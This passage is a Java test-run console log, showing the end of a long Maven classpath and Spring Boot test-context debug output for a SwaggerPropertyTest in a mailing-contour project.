s\Alex\.m2\repository\commons-validator\commons-validator\1.6\commons-validator-1.6.jar;C:\Users\Alex\.m2\repository\commons-beanutils\commons-beanutils\1.9.2\commons-beanutils-1.9.2.jar;C:\Users\Alex\.m2\repository\commons-digester\commons-digester\1.8.1\commons-digester-1.8.1.jar;C:\Users\Alex\.m2\repository\commons-logging\commons-logging\1.2\commons-logging-1.2.jar;C:\Users\Alex\.m2\repository\com\google\guava\guava\28.1-jre\guava-28.1-jre.jar;C:\Users\Alex\.m2\repository\com\google\guava\failureaccess\1.0.1\failureaccess-1.0.1.jar;C:\Users\Alex\.m2\repository\com\google\guava\listenablefuture\9999.0-empty-to-avoid-conflict-with-guava\listenablefuture-9999.0-empty-to-avoid-conflict-with-guava.jar;C:\Users\Alex\.m2\repository\com\google\code\findbugs\jsr305\3.0.2\jsr305-3.0.2.jar;C:\Users\Alex\.m2\repository\com\google\j2objc\j2objc-annotations\1.3\j2objc-annotations-1.3.jar;C:\Users\Alex\.m2\repository\org\codehaus\mojo\animal-sniffer-annotations\1.18\animal-sniffer-annotations-1.18.jar;C:\Users\Alex\.m2\repository\io\springfox\springfox-swagger2\2.9.2\springfox-swagger2-2.9.2.jar;C:\Users\Alex\.m2\repository\io\swagger\swagger-annotations\1.5.20\swagger-annotations-1.5.20.jar;C:\Users\Alex\.m2\repository\io\swagger\swagger-models\1.5.20\swagger-models-1.5.20.jar;C:\Users\Alex\.m2\repository\com\fasterxml\jackson\core\jackson-annotations\2.9.0\jackson-annotations-2.9.0.jar;C:\Users\Alex\.m2\repository\io\springfox\springfox-schema\2.9.2\springfox-schema-2.9.2.jar;C:\Users\Alex\.m2\repository\io\springfox\springfox-swagger-common\2.9.2\springfox-swagger-common-2.9.2.jar;C:\Users\Alex\.m2\repository\com\fasterxml\classmate\1.4.0\classmate-1.4.0.jar;C:\Users\Alex\.m2\repository\org\springframework\plugin\spring-plugin-core\1.2.0.RELEASE\spring-plugin-core-1.2.0.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\plugin\spring-plugin-metadata\1.2.0.RELEASE\spring-plugin-metadata-1.2.0.RELEASE.jar;C:\Users\Alex\.m2\repository\org\mapstruct\mapstruct\1.2.0.Final\mapstruct-1.2.0.Final.jar;C:\Users\Alex\.m2\repository\io\springfox\springfox-swagger-ui\2.9.2\springfox-swagger-ui-2.9.2.jar;C:\Users\Alex\.m2\repository\io\springfox\springfox-bean-validators\2.9.2\springfox-bean-validators-2.9.2.jar;C:\Users\Alex\.m2\repository\io\springfox\springfox-spi\2.9.2\springfox-spi-2.9.2.jar;C:\Users\Alex\.m2\repository\io\springfox\springfox-core\2.9.2\springfox-core-2.9.2.jar;C:\Users\Alex\.m2\repository\io\springfox\springfox-spring-web\2.9.2\springfox-spring-web-2.9.2.jar;C:\Users\Alex\.m2\repository\org\hibernate\validator\hibernate-validator\6.1.0.Alpha6\hibernate-validator-6.1.0.Alpha6.jar;C:\Users\Alex\.m2\repository\javax\validation\validation-api\2.0.1.Final\validation-api-2.0.1.Final.jar;C:\Users\Alex\.m2\repository\org\jboss\logging\jboss-logging\3.3.3.Final\jboss-logging-3.3.3.Final.jar;C:\Users\Alex\.m2\repository\ch\qos\logback\contrib\logback-json-classic\0.1.5\logback-json-classic-0.1.5.jar;C:\Users\Alex\.m2\repository\ch\qos\logback\contrib\logback-json-core\0.1.5\logback-json-core-0.1.5.jar;C:\Users\Alex\.m2\repository\ch\qos\logback\contrib\logback-jackson\0.1.5\logback-jackson-0.1.5.jar;C:\Users\Alex\.m2\repository\net\logstash\logback\logstash-logback-encoder\6.1\logstash-logback-encoder-6.1.jar;C:\Users\Alex\.m2\repository\com\fasterxml\jackson\core\jackson-databind\2.9.9.3\jackson-databind-2.9.9.3.jar;C:\Users\Alex\.m2\repository\com\fasterxml\jackson\dataformat\jackson-dataformat-yaml\2.9.9\jackson-dataformat-yaml-2.9.9.jar;C:\Users\Alex\.m2\repository\org\yaml\snakeyaml\1.23\snakeyaml-1.23.jar;C:\Users\Alex\.m2\repository\com\fasterxml\jackson\core\jackson-core\2.9.9\jackson-core-2.9.9.jar;C:\Users\Alex\.m2\repository\org\projectlombok\lombok\1.18.8\lombok-1.18.8.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-starter-test\2.1.8.RELEASE\spring-boot-starter-test-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-test\2.1.8.RELEASE\spring-boot-test-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-test-autoconfigure\2.1.8.RELEASE\spring-boot-test-autoconfigure-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\com\jayway\jsonpath\json-path\2.4.0\json-path-2.4.0.jar;C:\Users\Alex\.m2\repository\net\minidev\json-smart\2.3\json-smart-2.3.jar;C:\Users\Alex\.m2\repository\net\minidev\accessors-smart\1.2\accessors-smart-1.2.jar;C:\Users\Alex\.m2\repository\org\ow2\asm\asm\5.0.4\asm-5.0.4.jar;C:\Users\Alex\.m2\repository\org\skyscreamer\jsonassert\1.5.0\jsonassert-1.5.0.jar;C:\Users\Alex\.m2\repository\com\vaadin\external\google\android-json\0.0.20131108.vaadin1\android-json-0.0.20131108.vaadin1.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-test\5.1.9.RELEASE\spring-test-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\xmlunit\xmlunit-core\2.6.3\xmlunit-core-2.6.3.jar;C:\Users\Alex\.m2\repository\org\springframework\security\spring-security-test\5.1.6.RELEASE\spring-security-test-5.1.6.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\security\spring-security-core\5.1.6.RELEASE\spring-security-core-5.1.6.RELEASE.jar;C:\Users\Alex\.m2\repository\org\mockito\mockito-core\2.25.1\mockito-core-2.25.1.jar;C:\Users\Alex\.m2\repository\net\bytebuddy\byte-buddy\1.9.16\byte-buddy-1.9.16.jar;C:\Users\Alex\.m2\repository\net\bytebuddy\byte-buddy-agent\1.9.16\byte-buddy-agent-1.9.16.jar;C:\Users\Alex\.m2\repository\org\objenesis\objenesis\2.6\objenesis-2.6.jar;C:\Users\Alex\.m2\repository\it\ozimov\mockito-helpers\2.0.0\mockito-helpers-2.0.0.jar;C:\Users\Alex\.m2\repository\org\assertj\assertj-core\3.13.2\assertj-core-3.13.2.jar;C:\Users\Alex\.m2\repository\org\hamcrest\java-hamcrest\2.0.0.0\java-hamcrest-2.0.0.0.jar;C:\Users\Alex\.m2\repository\org\hamcrest\hamcrest-all\1.3\hamcrest-all-1.3.jar;C:\Users\Alex\.m2\repository\it\ozimov\hamcrest-matchers\2.0.0\hamcrest-matchers-2.0.0.jar;C:\Users\Alex\.m2\repository\junit\junit\4.13-beta-2\junit-4.13-beta-2.jar;C:\Users\Alex\.m2\repository\org\hamcrest\hamcrest-core\1.3\hamcrest-core-1.3.jar;C:\Users\Alex\.m2\repository\org\powermock\powermock-core\2.0.2\powermock-core-2.0.2.jar;C:\Users\Alex\.m2\repository\org\powermock\powermock-reflect\2.0.2\powermock-reflect-2.0.2.jar;C:\Users\Alex\.m2\repository\org\javassist\javassist\3.24.0-GA\javassist-3.24.0-GA.jar;C:\Users\Alex\.m2\repository\org\powermock\powermock-module-junit4\2.0.2\powermock-module-junit4-2.0.2.jar;C:\Users\Alex\.m2\repository\org\powermock\powermock-module-junit4-common\2.0.2\powermock-module-junit4-common-2.0.2.jar;C:\Users\Alex\.m2\repository\org\powermock\powermock-api-mockito2\2.0.2\powermock-api-mockito2-2.0.2.jar;C:\Users\Alex\.m2\repository\org\powermock\powermock-api-support\2.0.2\powermock-api-support-2.0.2.jar;C:\Users\Alex\.m2\repository\org\hibernate\validator\hibernate-validator-test-utils\6.1.0.Alpha6\hibernate-validator-test-utils-6.1.0.Alpha6.jar;C:\Users\Alex\.m2\repository\org\springframework\kafka\spring-kafka-test\2.2.8.RELEASE\spring-kafka-test-2.2.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\apache\kafka\kafka-clients\2.0.1\kafka-clients-2.0.1-test.jar;C:\Users\Alex\.m2\repository\org\apache\kafka\kafka_2.11\2.0.1\kafka_2.11-2.0.1.jar;C:\Users\Alex\.m2\repository\net\sf\jopt-simple\jopt-simple\5.0.4\jopt-simple-5.0.4.jar;C:\Users\Alex\.m2\repository\com\yammer\metrics\metrics-core\2.2.0\metrics-core-2.2.0.jar;C:\Users\Alex\.m2\repository\org\scala-lang\scala-library\2.11.12\scala-library-2.11.12.jar;C:\Users\Alex\.m2\repository\org\scala-lang\scala-reflect\2.11.12\scala-reflect-2.11.12.jar;C:\Users\Alex\.m2\repository\com\typesafe\scala-logging\scala-logging_2.11\3.9.0\scala-logging_2.11-3.9.0.jar;C:\Users\Alex\.m2\repository\com\101tec\zkclient\0.10\zkclient-0.10.jar;C:\Users\Alex\.m2\repository\org\apache\zookeeper\zookeeper\3.4.13\zookeeper-3.4.13.jar;C:\Users\Alex\.m2\repository\org\apache\yetus\audience-annotations\0.5.0\audience-annotations-0.5.0.jar;C:\Users\Alex\.m2\repository\org\apache\kafka\kafka_2.11\2.0.1\kafka_2.11-2.0.1-test.jar;C:\Users\Alex\.m2\repository\io\zonky\test\embedded-database-spring-test\1.5.1\embedded-database-spring-test-1.5.1.jar;C:\Users\Alex\.m2\repository\io\zonky\test\embedded-database-spring-test-autoconfigure\1.5.1\embedded-database-spring-test-autoconfigure-1.5.1.jar;C:\Users\Alex\.m2\repository\io\zonky\test\embedded-postgres\1.2.5\embedded-postgres-1.2.5.jar;C:\Users\Alex\.m2\repository\io\zonky\test\postgres\embedded-postgres-binaries-windows-amd64\10.10.0\embedded-postgres-binaries-windows-amd64-10.10.0.jar;C:\Users\Alex\.m2\repository\io\zonky\test\postgres\embedded-postgres-binaries-darwin-amd64\10.10.0\embedded-postgres-binaries-darwin-amd64-10.10.0.jar;C:\Users\Alex\.m2\repository\io\zonky\test\postgres\embedded-postgres-binaries-linux-amd64\10.10.0\embedded-postgres-binaries-linux-amd64-10.10.0.jar;C:\Users\Alex\.m2\repository\io\zonky\test\postgres\embedded-postgres-binaries-linux-amd64-alpine\10.10.0\embedded-postgres-binaries-linux-amd64-alpine-10.10.0.jar;C:\Users\Alex\.m2\repository\org\apache\commons\commons-compress\1.19\commons-compress-1.19.jar;C:\Users\Alex\.m2\repository\commons-codec\commons-codec\1.11\commons-codec-1.11.jar;C:\Users\Alex\.m2\repository\org\postgresql\postgresql\42.2.6\postgresql-42.2.6.jar;C:\Users\Alex\.m2\repository\org\flywaydb\flyway-core\5.2.4\flyway-core-5.2.4.jar;C:\Users\Alex\.m2\repository\org\flywaydb\flyway-test-extensions\flyway-spring-test\5.0.0\flyway-spring-test-5.0.0.jar;C:\Users\Alex\.m2\repository\commons-dbcp\commons-dbcp\1.4\commons-dbcp-1.4.jar;C:\Users\Alex\.m2\repository\commons-pool\commons-pool\1.6\commons-pool-1.6.jar;C:\Users\Alex\.m2\repository\org\tukaani\xz\1.8\xz-1.8.jar;C:\Users\Alex\.m2\repository\com\cedarsoftware\java-util\1.34.0\java-util-1.34.0.jar;C:\Users\Alex\.m2\repository\com\github\kstyrc\embedded-redis\0.6\embedded-redis-0.6.jar;C:\Users\Alex\.m2\repository\commons-io\commons-io\2.4\commons-io-2.4.jar" com.intellij.rt.execution.junit.JUnitStarter -ideVersion5 -junit4 com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest,test_SwaggerProperty_Constraint
05:31:32.413 [main] DEBUG org.springframework.test.context.junit4.SpringJUnit4ClassRunner - SpringJUnit4ClassRunner constructor called with [class com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]
05:31:32.422 [main] DEBUG org.springframework.test.context.BootstrapUtils - Instantiating CacheAwareContextLoaderDelegate from class [org.springframework.test.context.cache.DefaultCacheAwareContextLoaderDelegate]
05:31:32.446 [main] DEBUG org.springframework.test.context.BootstrapUtils - Instantiating BootstrapContext using constructor [public org.springframework.test.context.support.DefaultBootstrapContext(java.lang.Class,org.springframework.test.context.CacheAwareContextLoaderDelegate)]
05:31:32.499 [main] DEBUG org.springframework.test.context.BootstrapUtils - Instantiating TestContextBootstrapper for test class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest] from class [org.springframework.boot.test.context.SpringBootTestContextBootstrapper]
05:31:32.532 [main] INFO org.springframework.boot.test.context.SpringBootTestContextBootstrapper - Neither @ContextConfiguration nor @ContextHierarchy found for test class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest], using SpringBootContextLoader
05:31:32.543 [main] DEBUG org.springframework.test.context.support.AbstractContextLoader - Did not detect default resource location for test class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]: class path resource [com/paragon/mailingcontour/commons/swagger/property/SwaggerPropertyTest-context.xml] does not exist
05:31:32.545 [main] DEBUG org.springframework.test.context.support.AbstractContextLoader - Did not detect default resource location for test class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]: class path resource [com/paragon/mailingcontour/commons/swagger/property/SwaggerPropertyTestContext.groovy] does not exist
05:31:32.545 [main] INFO org.springframework.test.context.support.AbstractContextLoader - Could not detect default resource locations for test class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]: no resource found for suffixes {-context.xml, Context.groovy}.
05:31:32.642 [main] DEBUG org.springframework.test.util.ReflectionTestUtils - Getting field 'configuration' from target object [org.flywaydb.core.Flyway@473b46c3] or target class [class org.flywaydb.core.Flyway]
05:31:32.646 [main] DEBUG org.springframework.test.util.ReflectionTestUtils - Invoking method 'getUndoSqlMigrationPrefix' on target object [org.flywaydb.core.api.configuration.ClassicConfiguration@62bd765] with arguments {}
05:31:32.919 [main] DEBUG org.springframework.boot.test.context.SpringBootTestContextBootstrapper - @TestExecutionListeners is not present for class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]: using defaults.
05:31:32.920 [main] INFO org.springframework.boot.test.context.SpringBootTestContextBootstrapper - Loaded default TestExecutionListener class names from location [META-INF/spring.factories]: [org.springframework.boot.test.mock.mockito.MockitoTestExecutionListener, org.springframework.boot.test.mock.mockito.ResetMocksTestExecutionListener, org.springframework.boot.test.autoconfigure.restdocs.RestDocsTestExecutionListener, org.springframework.boot.test.autoconfigure.web.client.MockRestServiceServerResetTestExecutionListener, org.springframework.boot.test.autoconfigure.web.servlet.MockMvcPrintOnlyOnFailureTestExecutionListener, org.springframework.boot.test.autoconfigure.web.servlet.WebDriverTestExecutionListener, org.springframework.test.context.web.ServletTestExecutionListener, org.springframework.test.context.support.DirtiesContextBeforeModesTestExecutionListener, org.springframework.test.context.support.DependencyInjectionTestExecutionListener, org.springframework.test.context.support.DirtiesContextTestExecutionListener, org.springframework.test.context.transaction.TransactionalTestExecutionListener, org.springframework.test.context.jdbc.SqlScriptsTestExecutionListener, org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener, org.springframework.security.test.context.support.ReactorContextTestExecutionListener, io.zonky.test.db.flyway.OptimizedFlywayTestExecutionListener]
05:31:32.968 [main] INFO org.springframework.boot.test.context.SpringBootTestContextBootstrapper - Using TestExecutionListeners: [org.springframework.test.context.web.ServletTestExecutionListener@38afe297, org.springframework.test.context.support.DirtiesContextBeforeModesTestExecutionListener@2df3b89c, org.springframework.boot.test.mock.mockito.MockitoTestExecutionListener@23348b5d, org.springframework.boot.test.autoconfigure.SpringBootDependencyInjectionTestExecutionListener@70325e14, org.springframework.test.context.support.DirtiesContextTestExecutionListener@37ceb1df, io.zonky.test.db.flyway.OptimizedFlywayTestExecutionListener@7c9d8e2, org.springframework.test.context.transaction.TransactionalTestExecutionListener@20d525, org.springframework.test.context.jdbc.SqlScriptsTestExecutionListener@6200f9cb, org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener@2002fc1d, org.springframework.security.test.context.support.ReactorContextTestExecutionListener@69453e37, org.springframework.boot.test.mock.mockito.ResetMocksTestExecutionListener@6f4a47c7, org.springframework.boot.test.autoconfigure.restdocs.RestDocsTestExecutionListener@ae13544, org.springframework.boot.test.autoconfigure.web.client.MockRestServiceServerResetTestExecutionListener@3d34d211, org.springframework.boot.test.autoconfigure.web.servlet.MockMvcPrintOnlyOnFailureTestExecutionListener@7dc0f706, org.springframework.boot.test.autoconfigure.web.servlet.WebDriverTestExecutionListener@4009e306]
05:31:32.972 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved @ProfileValueSourceConfiguration [null] for test class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]
05:31:32.973 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved ProfileValueSource type [class org.springframework.test.annotation.SystemProfileValueSource] for class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]
05:31:32.975 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved @ProfileValueSourceConfiguration [null] for test class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]
05:31:32.975 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved ProfileValueSource type [class org.springframework.test.annotation.SystemProfileValueSource] for class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]
05:31:32.976 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved @ProfileValueSourceConfiguration [null] for test class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]
05:31:32.976 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved ProfileValueSource type [class org.springframework.test.annotation.SystemProfileValueSource] for class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]05:31:32.988 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved @ProfileValueSourceConfiguration [null] for test class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]
05:31:32.988 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved ProfileValueSource type [class org.springframework.test.annotation.SystemProfileValueSource] for class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]05:31:32.990 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved @ProfileValueSourceConfiguration [null] for test class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]
05:31:32.991 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved ProfileValueSource type [class org.springframework.test.annotation.SystemProfileValueSource] for class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]
05:31:32.992 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved @ProfileValueSourceConfiguration [null] for test class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]
05:31:32.992 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved ProfileValueSource type [class org.springframework.test.annotation.SystemProfileValueSource] for class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]
05:31:33.003 [main] DEBUG org.springframework.test.context.support.AbstractDirtiesContextTestExecutionListener - Before test class: context [DefaultTestContext@77f80c04 testClass = SwaggerPropertyTest, testInstance = [null], testMethod = [null], testException = [null], mergedContextConfiguration = [WebMergedContextConfiguration@1dac5ef testClass = SwaggerPropertyTest, locations = '{}', classes = '{class com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest$TestConfiguration, class com.paragon.mailingcontour.commons.swagger.property.SwaggerProperty, class com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest$TestConfiguration, class com.paragon.mailingcontour.commons.swagger.property.SwaggerProperty}', contextInitializerClasses = '[]', activeProfiles = '{test}', propertySourceLocations = '{}', propertySourceProperties = '{org.springframework.boot.test.context.SpringBootTestContextBootstrapper=true, server.port=0}', contextCustomizers = set[[ImportsContextCustomizer@5c90e579 key = [@com.paragon.mailingcontour.commons.system.annotation.SpringBootTestConfiguration(activeProfiles=[test], activeClasses=[class com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest$TestConfiguration, class com.paragon.mailingcontour.commons.swagger.property.SwaggerProperty], activeMethodMode=AFTER_METHOD, activeClassMode=BEFORE_EACH_TEST_METHOD), @org.springframework.boot.autoconfigure.AutoConfigurationPackage(), @org.junit.runner.RunWith(value=class org.springframework.test.context.junit4.SpringRunner), @org.springframework.test.annotation.DirtiesContext(hierarchyMode=EXHAUSTIVE, methodMode=AFTER_METHOD, classMode=AFTER_CLASS), @org.springframework.context.annotation.ComponentScan(scopeResolver=class org.springframework.context.annotation.AnnotationScopeMetadataResolver, lazyInit=false, resourcePattern=**/*.class, useDefaultFilters=true, excludeFilters=[@org.springframework.context.annotation.ComponentScan$Filter(pattern=[], type=ANNOTATION, value=[interface com.paragon.mailingcontour.commons.system.annotation.ExcludeFromTest], classes=[])], scopedProxy=DEFAULT, basePackageClasses=[], nameGenerator=interface org.springframework.beans.factory.support.BeanNameGenerator, basePackages=[], value=[], includeFilters=[]), @org.springframework.context.annotation.Import(value=[class org.springframework.boot.autoconfigure.AutoConfigurationPackages$Registrar]), @org.springframework.test.context.ActiveProfiles(profiles=[], resolver=interface org.springframework.test.context.ActiveProfilesResolver, value=[], inheritProfiles=true), @org.springframework.context.annotation.Import(value=[class org.springframework.boot.autoconfigure.AutoConfigurationImportSelector]), @org.springframework.test.context.BootstrapWith(value=class org.springframework.boot.test.context.SpringBootTestContextBootstrapper), @org.junit.FixMethodOrder(value=NAME_ASCENDING), @org.springframework.boot.test.context.SpringBootTest(webEnvironment=RANDOM_PORT, value=[], properties=[], classes=[]), @org.springframework.boot.autoconfigure.EnableAutoConfiguration(exclude=[class org.springframework.boot.autoconfigure.integration.IntegrationAutoConfiguration, class org.springframework.boot.autoconfigure.kafka.KafkaAutoConfiguration, class org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration, class org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration, class org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration, class org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration, class org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration, class org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration, class org.springframework.boot.actuate.autoconfigure.metrics.MetricsAutoConfiguration, class org.springframework.boot.actuate.autoconfigure.metrics.web.servlet.WebMvcMetricsAutoConfiguration, class org.springframework.boot.autoconfigure.security.servlet.UserDetailsServiceAutoConfiguration, class org.springframework.boot.autoconfigure.web.client.RestTemplateAutoConfiguration, class org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration, class org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration], excludeName=[])]], org.springframework.boot.test.context.filter.ExcludeFilterContextCustomizer@2ea6137, org.springframework.boot.test.json.DuplicateJsonObjectContextCustomizerFactory$DuplicateJsonObjectContextCustomizer@57d5872c, org.springframework.boot.test.mock.mockito.MockitoContextCustomizer@0, org.springframework.boot.test.web.client.TestRestTemplateContextCustomizer@341b80b2, org.springframework.boot.test.autoconfigure.properties.PropertyMappingContextCustomizer@0, org.springframework.boot.test.autoconfigure.web.servlet.WebDriverContextCustomizerFactory$Customizer@5ef60048], resourceBasePath = 'src/main/webapp', contextLoader = 'org.springframework.boot.test.context.SpringBootContextLoader', parent = [null]], attributes = map['org.springframework.test.context.web.ServletTestExecutionListener.activateListener' -> false]], class annotated with @DirtiesContext [true] with mode [BEFORE_EACH_TEST_METHOD].
05:31:33.004 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved @ProfileValueSourceConfiguration [null] for test class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]
05:31:33.004 [main] DEBUG org.springframework.test.annotation.ProfileValueUtils - Retrieved ProfileValueSource type [class org.springframework.test.annotation.SystemProfileValueSource] for class [com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest]
05:31:33.124 [main] DEBUG org.jboss.logging - Logging Provider: org.jboss.logging.Log4j2LoggerProvider
05:31:33.126 [main] INFO org.hibernate.validator.internal.util.Version - HV000001: Hibernate Validator 6.1.0.Alpha6
05:31:33.147 [main] DEBUG org.hibernate.validator.internal.engine.resolver.TraversableResolvers - Found javax.persistence.Persistence on classpath containing 'getPersistenceUtil'. Assuming JPA 2 environment. Trying to instantiate JPA aware TraversableResolver
05:31:33.149 [main] DEBUG org.hibernate.validator.internal.engine.resolver.TraversableResolvers - Instantiated JPA aware TraversableResolver of type org.hibernate.validator.internal.engine.resolver.JPATraversableResolver.
05:31:33.162 [main] DEBUG org.hibernate.validator.internal.xml.config.ValidationXmlParser - Trying to load META-INF/validation.xml for XML based Validator configuration.
05:31:33.167 [main] DEBUG org.hibernate.validator.internal.xml.config.ResourceLoaderHelper - Trying to load META-INF/validation.xml via TCCL
05:31:33.169 [main] DEBUG org.hibernate.validator.internal.xml.config.ResourceLoaderHelper - Trying to load META-INF/validation.xml via Hibernate Validator's class loader
05:31:33.171 [main] DEBUG org.hibernate.validator.internal.xml.config.ValidationXmlParser - No META-INF/validation.xml found. Using annotation based configuration only.
05:31:33.241 [main] DEBUG org.hibernate.validator.messageinterpolation.ResourceBundleMessageInterpolator - Loaded expression factory via original TCCL
05:31:33.566 [main] DEBUG org.hibernate.validator.internal.engine.ValidatorFactoryConfigurationHelper - HV000252: Using org.hibernate.validator.internal.engine.DefaultPropertyNodeNameProvider as property node name provider.
05:31:33.582 [main] DEBUG org.hibernate.validator.internal.engine.ValidatorFactoryConfigurationHelper - HV000234: Using org.hibernate.validator.messageinterpolation.ResourceBundleMessageInterpolator as ValidatorFactory-scoped message interpolator.
05:31:33.582 [main] DEBUG org.hibernate.validator.internal.engine.ValidatorFactoryConfigurationHelper - HV000234: Using org.hibernate.validator.internal.engine.resolver.JPATraversableResolver as ValidatorFactory-scoped traversable resolver.
05:31:33.582 [main] DEBUG org.hibernate.validator.internal.engine.ValidatorFactoryConfigurationHelper - HV000234: Using org.hibernate.validator.internal.util.ExecutableParameterNameProvider as ValidatorFactory-scoped parameter name provider.
05:31:33.583 [main] DEBUG org.hibernate.validator.internal.engine.ValidatorFactoryConfigurationHelper - HV000234: Using org.hibernate.validator.internal.engine.DefaultClockProvider as ValidatorFactory-scoped clock provider.
05:31:33.583 [main] DEBUG org.hibernate.validator.internal.engine.ValidatorFactoryConfigurationHelper - HV000234: Using org.hibernate.validator.internal.engine.scripting.DefaultScriptEvaluatorFactory as ValidatorFactory-scoped script evaluator factory.
05:31:33.652 [main] DEBUG org.springframework.test.context.support.DependencyInjectionTestExecutionListener - Performing dependency injection for test context [[DefaultTestContext@77f80c04 testClass = SwaggerPropertyTest, testInstance = com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest@7fbdb894, testMethod = [null], testException = [null], mergedContextConfiguration = [WebMergedContextConfiguration@1dac5ef testClass = SwaggerPropertyTest, locations = '{}', classes = '{class com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest$TestConfiguration, class com.paragon.mailingcontour.commons.swagger.property.SwaggerProperty, class com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest$TestConfiguration, class com.paragon.mailingcontour.commons.swagger.property.SwaggerProperty}', contextInitializerClasses = '[]', activeProfiles = '{test}', propertySourceLocations = '{}', propertySourceProperties = '{org.springframework.boot.test.context.SpringBootTestContextBootstrapper=true, server.port=0}', contextCustomizers = set[[ImportsContextCustomizer@5c90e579 key = [@com.paragon.mailingcontour.commons.system.annotation.SpringBootTestConfiguration(activeProfiles=[test], activeClasses=[class com.paragon.mailingcontour.commons.swagger.property.SwaggerPropertyTest$TestConfiguration, class com.paragon.mailingcontour.commons.swagger.property.SwaggerProperty], activeMethodMode=AFTER_METHOD, activeClassMode=BEFORE_EACH_TEST_METHOD), @org.springframework.boot.autoconfigure.AutoConfigurationPackage(), @org.junit.runner.RunWith(value=class org.springframework.test.context.junit4.SpringRunner), @org.springframework.test.annotation.DirtiesContext(hierarchyMode=EXHAUSTIVE, methodMode=AFTER_METHOD, classMode=AFTER_CLASS), @org.springframework.context.annotation.ComponentScan(scopeResolver=class org.springframework.context.annotation.AnnotationScopeMetadataResolver, lazyInit=false, resourcePattern=**/*.class, useDefaultFilters=true, excludeFilters=[@org.springframework.context.annotation.ComponentScan$Filter(pattern=[], type=ANNOTATION, value=[interface com.paragon.mailingcontour.commons.system.annotation.ExcludeFromTest], classes=[])], scopedProxy=DEFAULT, basePackageClasses=[], nameGenerator=interface org.springframework.beans.factory.support.BeanNameGenerator, basePackages=[], value=[], includeFilters=[]), @org.springframework.context.annotation.Import(value=[class org.springframework.boot.autoconfigure.AutoConfigurationPackages$Registrar]), @org.springframework.test.context.ActiveProfiles(profiles=[], resolver=interface org.springframework.test.context.ActiveProfilesResolver, value=[], inheritProfiles=true), @org.springframework.context.annotation.Import(value=[class org.springframework.boot.autoconfigure.AutoConfigurationImportSelector]), @org.springframework.test.context.BootstrapWith(value=class org.springframework.boot.test.context.SpringBootTestContextBootstrapper), @org.junit.FixMethodOrder(value=NAME_ASCENDING), @org.springframework.boot.test.context.SpringBootTest(webEnvironment=RANDOM_PORT, value=[], properties=[], classes=[]), @org.springframework.boot.autoconfigure.EnableAutoConfiguration(exclude=[class org.springframework.boot.autoconfigure.integration.IntegrationAutoConfiguration, class org.springframework.boot.autoconfigure.kafka.KafkaAutoConfiguration, class org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration, class org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration, class org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration, class org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration, class org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration, class 